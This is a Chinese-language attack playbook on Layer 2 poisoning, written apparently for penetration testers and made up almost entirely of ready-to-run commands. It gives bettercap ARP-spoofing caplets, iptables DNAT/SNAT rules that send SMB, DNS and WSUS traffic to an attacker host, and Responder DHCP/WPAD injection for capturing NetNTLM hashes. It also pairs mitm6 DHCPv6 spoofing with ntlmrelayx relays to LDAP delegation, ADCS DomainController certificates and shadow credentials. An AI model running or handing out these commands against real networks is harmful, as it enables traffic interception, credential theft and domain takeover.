# Layer 2 投毒技术详解

## 1. ARP 投毒

### 1.1 bettercap 完整 caplet

```bash
# arp-mitm.cap — 标准 ARP MITM caplet
set arp.spoof.targets $CLIENT_IP
set arp.spoof.internal false
set arp.spoof.fullduplex true

# 启用 any.proxy 重定向 SMB 流量
set any.proxy.src_address $SERVER_IP
set any.proxy.src_port 445
set any.proxy.dst_address $ATTACKER_IP
set any.proxy.dst_port 445

# 启动
arp.spoof on
any.proxy on
net.sniff on
```

```bash
# 使用 caplet 启动
bettercap -iface eth0 -caplet arp-mitm.cap
```

### 1.2 Proxy 模式 vs Rerouting 模式

**Proxy 模式**（any.proxy）：
- 将特定目标端口的流量重定向到攻击者本地端口
- 适合 SMB/HTTP 等需要中继的场景
- 攻击者在本地端口运行 ntlmrelayx

```bash
# SMB proxy: 将发往 $SERVER_IP:445 的流量转到本地 445
set any.proxy.src_address $SERVER_IP
set any.proxy.src_port 445
set any.proxy.dst_address $ATTACKER_IP
set any.proxy.dst_port 445
any.proxy on
```

**Rerouting 模式**（iptables 转发）：
- 通过 iptables 规则转发所有流量
- 适合全量流量监听（嗅探密码、会话劫持等）

```bash
# 开启 IP 转发
sysctl -w net.ipv4.ip_forward=1
iptables --policy FORWARD ACCEPT

# 流量正常转发，仅旁路嗅探
bettercap -iface eth0
set arp.spoof.targets $CLIENT_IP
arp.spoof on
net.sniff on
```

### 1.3 iptables 转发规则详解

```bash
# 基础转发
sysctl -w net.ipv4.ip_forward=1
iptables --policy FORWARD ACCEPT

# SMB 重定向到攻击者
iptables -t nat -A PREROUTING -p tcp --dport 445 -j REDIRECT --to-port 445

# DNS 重定向到攻击者
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53

# WSUS 重定向
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-port 8530
```

### 1.4 各场景 ARP 投毒配置

**SMB 中继场景**：

```bash
# ARP 投毒 + SMB 重定向到 ntlmrelayx
set arp.spoof.targets $CLIENT_IP
set any.proxy.src_address $SERVER_IP
set any.proxy.src_port 445
set any.proxy.dst_address $ATTACKER_IP
set any.proxy.dst_port 445
arp.spoof on
any.proxy on
```

**DNS 劫持场景**：

```bash
# ARP 投毒 + DNS 欺骗
set arp.spoof.targets $CLIENT_IP
arp.spoof on
set dns.spoof.domains *.$DOMAIN
set dns.spoof.address $ATTACKER_IP
dns.spoof on
```

**全流量嗅探场景**：

```bash
# ARP 投毒 + 网络嗅探（捕获明文凭证）
set arp.spoof.targets $SUBNET
set arp.spoof.fullduplex true
arp.spoof on
set net.sniff.verbose true
net.sniff on
```

### 1.5 IP 伪装绕过（SNAT/DNAT）

当目标服务验证源 IP 时，需要 NAT 伪装：

```bash
# DNAT: 将目标流量重定向到攻击者
iptables -t nat -A PREROUTING -p tcp -s $CLIENT_IP -d $SERVER_IP --dport 445 \
  -j DNAT --to-destination $ATTACKER_IP:445

# SNAT: 伪装源地址为原始服务器
iptables -t nat -A POSTROUTING -p tcp -s $CLIENT_IP -d $ATTACKER_IP --dport 445 \
  -j SNAT --to-source $SERVER_IP

# 回程流量
iptables -t nat -A PREROUTING -p tcp -s $ATTACKER_IP -d $CLIENT_IP --sport 445 \
  -j SNAT --to-source $SERVER_IP
```

---

## 2. DHCP 投毒

### 2.1 Responder DHCP 模式

```bash
# -d: 在 DHCP 响应中注入 DNS 服务器（指向攻击者）
# -D: 在 DHCP 响应中注入 WPAD URL
# -w: 启动 WPAD rogue proxy 服务器
# -P: 强制 Proxy NTLM 认证

# DNS + WPAD 全注入
responder -I "eth0" -wPdD

# 仅 WPAD 注入（更隐蔽）
responder -I "eth0" -wPd

# 仅 DNS 注入
responder -I "eth0" -dD
```

### 2.2 WPAD 注入详解

```bash
# Responder 注入的 WPAD 配置指向自身代理
# 客户端所有 HTTP 流量经过攻击者代理
# 代理要求 NTLM 认证 → 捕获 NetNTLM Hash

# 配合 ntlmrelayx 作为代理
# 终端 1
responder -I "eth0" -wPd
# 终端 2（ntlmrelayx 监听代理端口）
ntlmrelayx.py -t $TARGET --http-port 3128
```

### 2.3 效果持续时间

- DHCP 投毒效果持续到客户端 DHCP 租约过期
- 客户端重启或手动 `ipconfig /renew` 后失效
- 适合短期持久化，但不如 ADIDNS 稳定

---

## 3. DHCPv6/mitm6

### 3.1 mitm6 详细用法

```bash
# 基础用法
mitm6 --interface eth0 --domain $DOMAIN

# 限制目标范围（推荐，减少影响）
mitm6 --interface eth0 --domain $DOMAIN --host-allowlist $TARGET_HOSTNAME

# 忽略特定主机
mitm6 --interface eth0 --domain $DOMAIN --host-denylist $DC_HOSTNAME

# 指定 relay 目标 IP（作为 IPv6 DNS 返回的地址）
mitm6 --interface eth0 --domain $DOMAIN --relay $ATTACKER_IPV4
```

### 3.2 Windows IPv6 优先级原理

Windows 网络栈特性：
1. 默认启用 IPv6
2. IPv6 DNS 优先于 IPv4 DNS
3. 当收到 DHCPv6 响应时，自动配置 IPv6 DNS
4. 后续 DNS 查询走 IPv6 DNS（攻击者控制）

攻击链：DHCPv6 响应 → 客户端配置 IPv6 DNS → DNS 查询到攻击者 → 返回恶意 IP → 触发 NTLM 认证。

### 3.3 bettercap DHCPv6 替代

```bash
# DHCPv6 欺骗
set dhcp6.spoof.domains $DOMAIN
dhcp6.spoof on

# DNS 欺骗（响应 IPv6 DNS 查询）
set dns.spoof.domains *.$DOMAIN
set dns.spoof.address $ATTACKER_IP
dns.spoof on
```

### 3.4 经典组合场景

```bash
# 场景 1: mitm6 + LDAP relay + RBCD
mitm6 -d $DOMAIN
ntlmrelayx.py -t ldaps://$DC -wh wpad.$DOMAIN --delegate-access

# 场景 2: mitm6 + ADCS relay
mitm6 -d $DOMAIN
ntlmrelayx.py -t http://$CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 场景 3: mitm6 + Shadow Credentials
mitm6 -d $DOMAIN
ntlmrelayx.py -t ldaps://$DC --shadow-credentials --shadow-target $TARGET_HOSTNAME$
```

---

## 4. ICMP 重定向

### 4.1 Responder ICMP Redirect 工具

```bash
# 使用 Responder 自带脚本
python3 tools/Icmp-Redirect.py \
  --interface eth0 \
  --ip $ATTACKER_IP \
  --gateway $GATEWAY \
  --target $TARGET \
  --route $DNS_SERVER
```

### 4.2 实际限制

- Windows 10/11 默认忽略 ICMP Redirect
- Linux 内核参数 `net.ipv4.conf.all.accept_redirects` 默认为 0
- 仅在旧系统（Windows 7/Server 2008）或特殊配置环境中有效
- 优先考虑 ARP 投毒或 DHCPv6 等更可靠方式
